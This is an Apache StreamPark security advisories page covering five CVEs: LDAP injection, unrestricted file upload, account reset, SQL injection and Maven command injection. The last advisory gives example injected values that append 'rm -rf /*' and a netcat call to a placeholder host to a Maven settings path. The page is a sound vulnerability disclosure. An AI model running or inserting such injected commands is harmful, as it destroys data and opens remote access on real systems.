---
title: Apache StreamPark (Incubating) security advisories
description: Security information for Apache StreamPark (Incubating)
layout: single
---

# Reporting

Do you want disclose a potential security issue for Apache StreamPark (Incubating)? Send your report to the [Apache Security Team](mailto:security@apache.org).

# Advisories

This section is experimental: it provides advisories since 2023 and may lag behind the official CVE publications. If you have any feedback on how you would like this data to be provided, you are welcome to reach out on our public [mailinglist](/mailinglist) or privately on [security@apache.org](mailto:security@apache.org)
{.bg-warning}

## LDAP Injection Vulnerability ## { #CVE-2022-45801 }

CVE-2022-45801 [\[CVE json\]](./CVE-2022-45801.cve.json) [\[OSV json\]](./CVE-2022-45801.osv.json)



_Last updated: 2023-05-01T14:50:06.013Z_

### Affected

* Apache StreamPark (incubating) from 1.0.0 before 2.0.0


### Description

<div><div><span style="background-color: rgb(255, 255, 255);">Apache StreamPark 1.0.0 to 2.0.0 have a LDAP injection vulnerability.</span><br><span style="background-color: rgb(255, 255, 255);">LDAP Injection is an attack used to exploit web based applications</span><br><span style="background-color: rgb(255, 255, 255);">that construct LDAP statements based on user input. When an</span><br><span style="background-color: rgb(255, 255, 255);">application fails to properly sanitize user input, it's possible to</span><br><span style="background-color: rgb(255, 255, 255);">modify LDAP statements through techniques similar to SQL Injection.</span><br><span style="background-color: rgb(255, 255, 255);">LDAP injection attacks could result in the granting of permissions to</span><br><span style="background-color: rgb(255, 255, 255);">unauthorized queries, and content modification inside the LDAP tree.</span><br><span style="background-color: rgb(255, 255, 255);">This risk may only occur when the user logs in with ldap, and the user</span><br><span style="background-color: rgb(255, 255, 255);">name and password login will not be affected, Users of the affected</span><br><span style="background-color: rgb(255, 255, 255);">versions should upgrade to Apache StreamPark 2.0.0 or later.</span><br><br></div></div><br>

### References
* https://lists.apache.org/thread/xbkwwpkp3n2rs2wcxg8l26mhsftxwwr9


## Upload any file to any directory ## { #CVE-2022-45802 }

CVE-2022-45802 [\[CVE json\]](./CVE-2022-45802.cve.json) [\[OSV json\]](./CVE-2022-45802.osv.json)



_Last updated: 2023-06-26T10:23:44.595Z_

### Affected

* Apache StreamPark (incubating) from 1.0.0 before 2.0.0


### Description

<div><div><span style="background-color: var(--wht);">Streampark allows any users to upload a jar as application, but there is no mandatory verification of the uploaded file type, causing users to upload some high-risk files, and may upload them to any directory,&nbsp;</span><span style="background-color: var(--wht);">Users of the affected versions should upgrade to Apache StreamPark 2.0.0 or later</span></div><br></div><br><br>

### References
* https://lists.apache.org/thread/thwl1v2h6r3c21x1qwff08o57qzjnst6


## Logic error causing any account reset ## { #CVE-2022-46365 }

CVE-2022-46365 [\[CVE json\]](./CVE-2022-46365.cve.json) [\[OSV json\]](./CVE-2022-46365.osv.json)



_Last updated: 2023-05-01T14:53:47.030Z_

### Affected

* Apache StreamPark (incubating) from 1.0.0 before 2.0.0


### Description

<span style="background-color: rgb(255, 255, 255);"><span style="background-color: rgb(255, 255, 255);"><div><div>Apache StreamPark 1.0.0 <span style="background-color: rgb(255, 255, 255);">before</span> 2.0.0 When the user successfully logs in, to modify his profile, the username will be passed to the server-layer&nbsp;as a parameter, but not verified whether the user name is the currently logged user and whether the user is legal, This will allow malicious attackers to send any username to modify and reset the account,&nbsp;<span style="background-color: rgb(255, 255, 255);">Users of the affected&nbsp;</span><span style="background-color: rgb(255, 255, 255);">versions should upgrade to Apache StreamPark 2.0.0 or later.</span></div></div></span></span><br>

### References
* https://lists.apache.org/thread/f68lcwrp8pcdc4yrbpcm8j7m0f5mjn7h


## Authenticated system users could trigger SQL injection vulnerability ## { #CVE-2023-30867 }

CVE-2023-30867 [\[CVE json\]](./CVE-2023-30867.cve.json) [\[OSV json\]](./CVE-2023-30867.osv.json)



_Last updated: 2023-12-15T12:13:59.544Z_

### Affected

* Apache StreamPark (incubating) from 2.0.0 before 2.1.2


### Description

<div><span style="background-color: var(--wht);">In the Streampark platform, when users log in to the system and use certain features, some pages provide a name-based fuzzy search, such as job names, role names, etc. The sql syntax :select * from table where jobName like '%jobName%'. However, the jobName field may receive illegal parameters, leading to SQL injection. This could potentially result in information leakage.</span><div><span style="background-color: var(--wht);"><br></span></div><br><div>Mitigation:</div><div><br></div><span style="background-color: rgb(255, 255, 255);">Users are recommended to upgrade to version 2.1.2, which fixes the issue.</span><br><br></div><br><p></p>

### References
* https://lists.apache.org/thread/bhdzh6hnh04yyf3g203bbyvxryd720o2


## Authenticated system users could trigger remote command execution ## { #CVE-2023-49898 }

CVE-2023-49898 [\[CVE json\]](./CVE-2023-49898.cve.json) [\[OSV json\]](./CVE-2023-49898.osv.json)



_Last updated: 2023-12-15T12:13:22.953Z_

### Affected

* Apache StreamPark (incubating) from 2.0.0 before 2.1.2


### Description

<div>In streampark, there is a project module that integrates Maven's compilation capability. However, there is no check on the compilation parameters of Maven. allowing attackers to insert commands for remote command execution, The prerequisite for a successful attack is that the user needs to log in to the streampark system and have system-level permissions. Generally, only users of that system have the authorization to log in, and users would not manually input a dangerous operation command. Therefore, the risk level of this vulnerability is very low.<br><br><div>Mitigation:<br><br></div>all users&nbsp;<span style="background-color: var(--wht);">should upgrade to 2.1.2</span><div><br></div><br><div>Example:<br><br><div><p></p><div>##You can customize the splicing method according to the compilation situation of the project, mvn compilation results use &amp;&amp;, compilation failure use "||" or "&amp;&amp;":<br><br><span style="background-color: var(--wht);">/usr/share/java/maven-3/conf/settings.xml || rm -rf /*</span><br></div><p></p></div></div><div><div>/usr/share/java/maven-3/conf/settings.xml &amp;&amp; nohup nc x.x.x.x 8899 &amp;</div><br></div></div><p></p>

### References
* https://lists.apache.org/thread/qj99c03r4td35f8gbxq084b8qmv2fyr3
